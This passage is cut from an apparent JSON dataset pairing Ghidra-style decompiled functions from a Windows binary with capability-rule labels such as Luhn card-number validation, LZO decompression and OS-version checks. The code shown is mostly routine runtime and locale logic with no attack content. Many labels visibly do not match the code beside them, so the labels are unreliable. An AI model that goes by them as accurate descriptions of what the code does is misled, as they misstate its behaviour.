       pcVar7 = pcVar5 + pcVar7 + (1 - var_10h);\n                var_8h = var_8h + 1;\n                uVar6 = uVar6 + 1;\n                var_4h = pcVar7;\n            } while (uVar6 != uVar9);\n        }\n        iVar8 = fcn.00405fa6(var_ch, var_4h, 1);\n        if (iVar8 == 0) {\n            iVar8 = -1;\n            var_8h = 0xffffffff;\n        }\n        else {\n            var_ch = iVar8 + var_ch * 4;\n            var_18h = var_ch;\n            if (ppcVar10 != var_24h) {\n                var_1ch = iVar8 - ppcVar10;\n                var_8h = ppcVar10;\n                do {\n                    var_14h = *var_8h;\n                    var_10h = var_14h;\n                    do {\n                        cVar1 = *var_10h;\n                        var_10h = var_10h + 1;\n                    } while (cVar1 != '\\0');\n                    var_10h = var_10h + (1 - (var_14h + 1));\n                    iVar4 = fcn.00402a04(var_ch, var_4h + (var_18h - var_ch), var_14h, var_10h);\n                    if (iVar4 != 0) {\n                        fcn.0040366b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar8 = (*pcVar2)();\n                        return iVar8;\n                    }\n                    *(var_1ch + var_8h) = var_ch;\n                    var_8h = var_8h + 1;\n                    var_ch = var_ch + var_10h;\n                } while (var_8h != var_24h);\n            }\n            var_8h = NULL;\n            *arg_ch = iVar8;\n            iVar8 = 0;\n        }\n        fcn.0040640b(0);\ncode_r0x004c687a:\n        uVar6 = 0;\n        uVar9 = ~-(var_24h < ppcVar10) & var_24h + (3 - ppcVar10) >> 2;\n        arg_8h_00 = ppcVar10;\n        var_1ch = ppcVar10;\n        var_18h = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.0040640b(*ppcVar10);\n                uVar6 = uVar6 + 1;\n                ppcVar10 = ppcVar10 + 1;\n                iVar8 = var_8h;\n                arg_8h_00 = var_28h;\n            } while (uVar6 != uVar9);\n        }\n        fcn.0040640b(arg_8h_00);\n    }\n    return iVar8;\n}\n",
        "token_count": 1345
    },
    "004061b8": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061b8(code **arg_8h, code **arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar3 = 0;\n    uVar2 = ~-(arg_ch < arg_8h) & arg_ch + (3 - arg_8h) >> 2;\n    if (uVar2 != 0) {\n        do {\n            pcVar1 = *arg_8h;\n            if (pcVar1 != NULL) {\n                (**0x578000)();\n                (*pcVar1)();\n            }\n            arg_8h = arg_8h + 1;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != uVar2);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "004065d7": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.004065d7(int16_t **arg_8h, int16_t **arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *arg_10h;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int16_t **ppiVar8;\n    int16_t **arg_8h_00;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *var_34h;\n    uint var_30h;\n    int16_t **var_2ch;\n    int16_t **var_28h;\n    uint var_24h;\n    int16_t **var_20h;\n    int16_t *var_1ch;\n    int16_t *var_18h;\n    int16_t **var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    ushort var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_20h = arg_ch;\n    var_14h = arg_8h;\n    if (arg_ch == NULL) {\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        uVar10 = 0;\n        *arg_ch = NULL;\n        piVar5 = *arg_8h;\n        var_2ch = NULL;\n        var_28h = NULL;\n        var_24h = 0;\n        ppiVar8 = var_2ch;\n        while (var_2ch = ppiVar8,  piVar5 != NULL) {\n            var_ch = 0x3f002a;\n            var_8h = 0;\n            var_14h = arg_8h;\n            iVar4 = fcn.00403963(piVar5, &var_ch);\n            if (iVar4 == 0) {\n                var_10h = fcn.004c6cd3(*arg_8h, 0, 0, &var_2ch);\n            }\n            else {\n                var_10h = fcn.004c70a0(*arg_8h, iVar4, &var_2ch);\n            }\n            ppiVar8 = var_2ch;\n            if (var_10h != 0) goto code_r0x004c6b13;\n            arg_8h = var_14h + 1;\n            piVar5 = *arg_8h;\n        }\n        var_10h = 0;\n        var_1ch = (var_28h - ppiVar8 >> 2) + 1;\n        uVar9 = ~-(var_28h < ppiVar8) & (var_28h - ppiVar8) + 3U >> 2;\n        var_14h = ppiVar8;\n        if (uVar9 != 0) {\n            uVar7 = 0;\n            do {\n                piVar5 = *var_14h;\n                var_18h = piVar5 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                var_10h = var_10h + 1 + (piVar5 - var_18h >> 1);\n                var_14h = var_14h + 1;\n                uVar7 = uVar7 + 1;\n            } while (uVar7 != uVar9);\n        }\n        piVar5 = fcn.00405fa6(var_1ch, var_10h, 2);\n        if (piVar5 == NULL) {\n            var_10h = -1;\n        }\n        else {\n            var_34h = piVar5 + var_1ch * 2;\n            var_1ch = var_34h;\n            var_14h = ppiVar8;\n            if (ppiVar8 != var_28h) {\n                var_ch = piVar5 - ppiVar8;\n                do {\n                    arg_10h = *var_14h;\n                    piVar6 = arg_10h;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != 0);\n                    var_18h = (piVar6 - (arg_10h + 1) >> 1) + 1;\n                    iVar4 = fcn.00405b64(var_1ch, var_10h - (var_1ch - var_34h >> 1), arg_10h, var_18h);\n                    if (iVar4 != 0) {\n                        fcn.0040366b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    *(var_ch + var_14h) = var_1ch;\n                    var_14h = var_14h + 1;\n                    var_1ch = var_1ch + var_18h;\n                } while (var_14h != var_28h);\n            }\n            var_10h = 0;\n            *var_20h = piVar5;\n        }\n        fcn.0040640b(0);\ncode_r0x004c6b13:\n        uVar9 = ~-(var_28h < ppiVar8) & var_28h + (3 - ppiVar8) >> 2;\n        arg_8h_00 = ppiVar8;\n        var_20h = ppiVar8;\n        var_ch = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.0040640b(*ppiVar8);\n                uVar10 = uVar10 + 1;\n                ppiVar8 = ppiVar8 + 1;\n                arg_8h_00 = var_2ch;\n            } while (uVar10 != uVar9);\n        }\n        fcn.0040640b(arg_8h_00);\n    }\n    fcn.004030bc(var_34h);\n    return;\n}\n",
        "token_count": 1432
    },
    "0040263f": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040263f(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *in_ECX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    (**(*in_ECX + 0x24))(arg_8h, arg_ch, noname_2, arg_14h, arg_18h, arg_1ch);\n    return arg_8h;\n}\n",
        "token_count": 146
    },
    "00404cc8": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404cc8(uint arg_8h)\n\n{\n    fcn.00403b02();\n    return 0xd217;\n}\n",
        "token_count": 35
    },
    "004051a0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004051a0(uint *arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    _var_10h = fcn.00402d29(0);\n    fcn.00402d47(&var_10h);\n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        fcn.0040658c(1);\n    }\n    else {\n        *0x574458 = *0x574458 + 1;\n        if (cVar1 == '0') {\n            var_10h = \"void\";\n            var_ch = 4;\n            fcn.00405d71(&var_10h);\n        }\n        else if (cVar1 == '2') {\n            arg_8h_00 = fcn.004064b0(&var_10h);\n            fcn.00402eeb(arg_8h_00);\n        }\n        else if (cVar1 == '5') {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 1) = 2;\n            return;\n        }\n    }\n    var_10h = 0x5559b0;\n    var_ch = 2;\n    fcn.00405d71(&var_10h);\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return;\n}\n",
        "token_count": 360
    },
    "00405a60": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl fcn.00405a60(uint noname_0, uint8_t **arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_30h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    puVar3 = &arg_10h;\n    puVar4 = &var_30h;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    uVar1 = fcn.00405015(**arg_ch, 0, &var_30h);\n    *(in_ECX + 0xc) = uVar1;\n    uVar1 = fcn.00405015(*arg_ch[1], 0, &var_30h);\n    *(in_ECX + 0xe) = uVar1;\n    fcn.004030bc(var_30h);\n    return;\n}\n",
        "token_count": 299
    },
    "00406163": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406163(uint noname_0, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *arg_10h;\n    uint *puVar4;\n    uint uVar5;\n    uint var_30h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    puVar1 = fcn.0040273e(&var_30h);\n    arg_10h = in_ECX + 0x18;\n    puVar4 = arg_10h;\n    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = 0;\n    puVar1 = arg_10h;\n    uVar2 = fcn.004042a5();\n    uVar2 = fcn.004030a3(uVar2, uVar5, puVar1);\n    uVar5 = 0;\n    *(var_4h + 8) = uVar2;\n    puVar1 = arg_10h;\n    uVar2 = fcn.00405597();\n    uVar2 = fcn.004030a3(uVar2, uVar5, puVar1);\n    *(var_4h + 0xc) = uVar2;\n    uVar2 = fcn.004030a3(\":AM:am:PM:pm\", 0, arg_10h);\n    *(var_4h + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 393
    },
    "00405dc6": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405dc6(uint noname_0, code *arg_ch)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint var_30h;\n    uint var_4h;\n    \n    in_ECX[1] = arg_ch;\n    *in_ECX = vtable.std::codecvt_unsigned_short_int__char__struct__Mbstatet_.0;\n    ppcVar1 = fcn.0040273e(&var_30h);\n    ppcVar3 = in_ECX + 2;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppcVar3 = *ppcVar1;\n        ppcVar1 = ppcVar1 + 1;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00406320": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406320(uint noname_0, code *arg_ch)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint var_30h;\n    uint var_4h;\n    \n    in_ECX[1] = arg_ch;\n    *in_ECX = vtable.std::codecvt_wchar_t__char__struct__Mbstatet_.0;\n    ppcVar1 = fcn.0040273e(&var_30h);\n    ppcVar3 = in_ECX + 2;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppcVar3 = *ppcVar1;\n        ppcVar1 = ppcVar1 + 1;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00405bfa": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bfa(uint noname_0, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *arg_10h;\n    uint *puVar4;\n    uint uVar5;\n    uint var_30h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    puVar1 = fcn.0040273e(&var_30h);\n    arg_10h = in_ECX + 0x18;\n    puVar4 = arg_10h;\n    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = 0;\n    puVar1 = arg_10h;\n    uVar2 = fcn.004042a5();\n    uVar2 = fcn.00401cc1(uVar2, uVar5, puVar1);\n    uVar5 = 0;\n    *(var_4h + 8) = uVar2;\n    puVar1 = arg_10h;\n    uVar2 = fcn.00405597();\n    uVar2 = fcn.00401cc1(uVar2, uVar5, puVar1);\n    *(var_4h + 0xc) = uVar2;\n    uVar2 = fcn.00401cc1(\":AM:am:PM:pm\", 0, arg_10h);\n    *(var_4h + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 394
    },
    "0040209f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nbool __cdecl fcn.0040209f(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_8h;\n    uint var_3h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_8h_00 = uVar1;\n    if ((uVar1 == 0x70) || (arg_10h == 0x70)) {\n        return (uVar1 == 0x70) != (arg_10h != 0x70);\n    }\n    cVar2 = fcn.00402f0e(arg_8h_00);\n    cVar3 = fcn.00402f0e(arg_10h);\n    cVar4 = fcn.00406875(arg_8h_00);\n    cVar5 = fcn.00406875(arg_10h);\n    if (cVar2 == '\\0') {\n        if (cVar3 != '\\0') {\n            return false;\n        }\n        if (cVar4 == '\\0') {\n            if (cVar5 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.004025db(arg_8h_00);\n            cVar3 = fcn.004025db(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar6 = fcn.00402798(arg_8h[3]);\n            iVar7 = fcn.00402798(arg_14h);\n            return iVar6 == iVar7;\n        }\n    }\n    else if (cVar2 != cVar3) {\n        return false;\n    }\n    if (cVar4 == cVar5) {\n        cVar2 = fcn.00401893(*in_ECX, in_ECX[1], arg_8h_00, arg_8h[3]);\n        cVar3 = fcn.00401893(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 633
    },
    "00402b99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nbool __cdecl fcn.00402b99(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_8h;\n    uint var_3h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_8h_00 = uVar1;\n    if ((uVar1 == 0x70) || (arg_10h == 0x70)) {\n        return (uVar1 == 0x70) != (arg_10h != 0x70);\n    }\n    cVar2 = fcn.00404b01(arg_8h_00);\n    cVar3 = fcn.00404b01(arg_10h);\n    cVar4 = fcn.004051aa(arg_8h_00);\n    cVar5 = fcn.004051aa(arg_10h);\n    if (cVar2 == '\\0') {\n        if (cVar3 != '\\0') {\n            return false;\n        }\n        if (cVar4 == '\\0') {\n            if (cVar5 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.004038e1(arg_8h_00);\n            cVar3 = fcn.004038e1(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar6 = fcn.00402798(arg_8h[3]);\n            iVar7 = fcn.00402798(arg_14h);\n            return iVar6 == iVar7;\n        }\n    }\n    else if (cVar2 != cVar3) {\n        return false;\n    }\n    if (cVar4 == cVar5) {\n        cVar2 = fcn.00401893(*in_ECX, in_ECX[1], arg_8h_00, arg_8h[3]);\n        cVar3 = fcn.00401893(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 633
    },
    "00403cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403cc4(uint32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    if (9 < arg_8h) {\n        return 1;\n    }\n    // switch table (10 cases) at 0x4b693e\n    switch(*(arg_8h * 4 + 0x4b693e)) {\n    case 0x4b685a:\n        uVar2 = fcn.004049da(arg_ch, arg_10h);\n        return uVar2;\n    case 0x4b6869:\n        uVar2 = fcn.00402135(arg_ch, arg_10h);\n        return uVar2;\n    case 0x4b6876:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f;\n        break;\n    case 0x4b6894:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7ff00000;\n        break;\n    case 0x4b68ad:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7fffffff;\n        *arg_10h = 0xffffffff;\n        goto code_r0x004b688d;\n    case 0x4b68cc:\n        fcn.00404bba(*(arg_ch + 0x308), arg_10h);\n        return 0;\n    case 0x4b68e3:\n        *arg_10h = 0;\n        arg_10h[1] = 0xfff80000;\n        return 0;\n    case 0x4b68f2:\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return 1;\n    case 0x4b6901:\n        uVar2 = 2;\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f;\n        goto code_r0x004b6914;\n    case 0x4b6920:\n        uVar2 = 3;\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7ff00000;\ncode_r0x004b6914:\n        *arg_10h = 0;\n        arg_10h[1] = uVar1;\n        return uVar2;\n    }\n    *arg_10h = 0;\ncode_r0x004b688d:\n    arg_10h[1] = uVar1;\n    return 0;\n}\n",
        "token_count": 619
    },
    "004050a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004050a6(uint16_t *arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t in_stack_ffffffdc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0;\n    uVar2 = *arg_8h;\n    do {\n        if ((uVar2 != *(iVar3 + 0x5586a8)) && (uVar2 != *(iVar3 + 0x5586b0))) {\n            fcn.004b6d9c();\n            return in_stack_ffffffdc;\n        }\n        iVar3 = iVar3 + 2;\n        uVar4 = **arg_ch;\n        uVar2 = uVar4;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar4;\n    } while (iVar3 != 6);\n    fcn.00402f04(uVar2);\n    uVar4 = **arg_ch;\n    *arg_ch = *arg_ch + 1;\n    *arg_8h = uVar4;\n    if (uVar4 == 0x28) {\n        uVar4 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar4;\n        cVar1 = fcn.004031b1(arg_8h, arg_ch);\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00403490(arg_8h, arg_ch);\n            uVar4 = *arg_8h;\n            uVar2 = uVar4;\n            if (cVar1 == '\\0') {\n                while ((uVar4 != 0x29 && (uVar4 = uVar2,  uVar4 != 0))) {\n                    if ((9 < uVar2 - 0x30) && (((0x19 < uVar2 - 0x61 && (0x19 < uVar2 - 0x41)) && (uVar4 != 0x5f))))\n                    goto code_r0x004b64c3;\n                    uVar4 = **arg_ch;\n                    *arg_ch = *arg_ch + 1;\n                    *arg_8h = uVar4;\n                    uVar2 = uVar4;\n                }\n                if (uVar4 == 0x29) {\n                    iVar3 = 4;\n                }\n                else {\ncode_r0x004b64c3:\n                    cVar1 = fcn.004b6d9c();\n                    iVar3 = (-(cVar1 != '\\0') & 0xfffffffd) + 7;\n                }\n            }\n            else {\n                fcn.00402f04(uVar2);\n                iVar3 = 6;\n            }\n        }\n        else {\n            fcn.00402f04(*arg_8h);\n            iVar3 = 5;\n        }\n    }\n    else {\n        cVar1 = fcn.004b6d9c();\n        iVar3 = (-(cVar1 != '\\0') & 0xfffffffd) + 7;\n    }\n    return iVar3;\n}\n",
        "token_count": 726
    },
    "00405b5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405b5f(uint32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    if (9 < arg_8h) {\n        return 1;\n    }\n    // switch table (10 cases) at 0x4b67bf\n    switch(*(arg_8h * 4 + 0x4b67bf)) {\n    case 0x4b6694:\n        uVar2 = fcn.00402446(arg_ch, arg_10h);\n        break;\n    case 0x4b66a6:\n        uVar2 = fcn.00405f4c(arg_ch, arg_10h);\n        break;\n    case 0x4b66b3:\n        uVar1 = -(*(arg_ch + 0x308) != '\\0') & 0x80000000;\n        goto code_r0x004b66ca;\n    case 0x4b66d6:\n        uVar1 = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7f800000 | *arg_10h & 0x7f800000;\n        goto code_r0x004b6701;\n    case 0x4b6705:\n        uVar1 = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7fffffff;\ncode_r0x004b66ca:\n        *arg_10h = uVar1;\ncode_r0x004b66cf:\n        uVar2 = 0;\n        break;\n    case 0x4b6722:\n        uVar1 = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7f800000 | *arg_10h & 0x7f800000 | 1;\ncode_r0x004b6701:\n        *arg_10h = uVar1;\n        goto code_r0x004b66cf;\n    case 0x4b6752:\n        *arg_10h = 0xffc00000;\n        goto code_r0x004b66cf;\n    case 0x4b6760:\n        *arg_10h = 0;\n        return 1;\n    case 0x4b676c:\n        uVar2 = 2;\n        *arg_10h = -(*(arg_ch + 0x308) != '\\0') & 0x80000000;\n        break;\n    case 0x4b678d:\n        uVar2 = 3;\n        *arg_10h = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7f800000 | *arg_10h & 0x7f800000;\n    }\n    return uVar2;\n}\n",
        "token_count": 673
    },
    "004031b1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint16_t __cdecl fcn.004031b1(uint16_t *arg_8h, uint16_t **arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    \n    uVar3 = 0;\n    iVar2 = 0;\n    uVar1 = *arg_8h;\n    do {\n        if ((uVar1 != *(iVar2 + 0x5586d0)) && (uVar1 != *(L\"snan)\" + iVar2))) goto code_r0x004b6663;\n        iVar2 = iVar2 + 2;\n        uVar1 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar1;\n    } while (iVar2 != 10);\n    uVar3 = 1;\ncode_r0x004b6663:\n    return uVar1 & 0xff00 | uVar3;\n}\n",
        "token_count": 213
    },
    "00405afb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405afb(uint16_t *arg_8h, uint16_t **arg_ch, uint16_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uStackY32;\n    uint var_4h;\n    \n    uVar2 = *arg_8h;\n    iVar4 = 0;\n    iVar3 = 0;\n    while ((uVar2 == *(iVar3 + 0x558680) || (uVar2 == *(iVar3 + 0x558688)))) {\n        iVar3 = iVar3 + 2;\n        uVar1 = **arg_ch;\n        uVar2 = uVar1;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar1;\n        if (iVar3 == 6) {\n            fcn.00402f04(uVar2);\n            arg_10h = *arg_ch;\n            uVar1 = *arg_10h;\n            uVar2 = uVar1;\n            *arg_ch = arg_10h + 1;\n            *arg_8h = uVar1;\n            while ((uVar2 == *(L\"INITY\" + iVar4) || (uVar2 == *(L\"inity\" + iVar4)))) {\n                iVar4 = iVar4 + 2;\n                uVar1 = **arg_ch;\n                uVar2 = uVar1;\n                *arg_ch = *arg_ch + 1;\n                *arg_8h = uVar1;\n                if (iVar4 == 10) {\n                    fcn.00402f04(uVar2);\n                    return 3;\n                }\n            }\n            fcn.00402f04(uVar2);\n            uStackY32 = 3;\ncode_r0x004b6204:\n            *arg_8h = 0;\n            *arg_ch = arg_10h;\n            return uStackY32;\n        }\n    }\n    fcn.00402f04(uVar2);\n    goto code_r0x004b6204;\n}\n",
        "token_count": 467
    },
    "00401965": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401965(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 95
    },
    "00401b8b": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
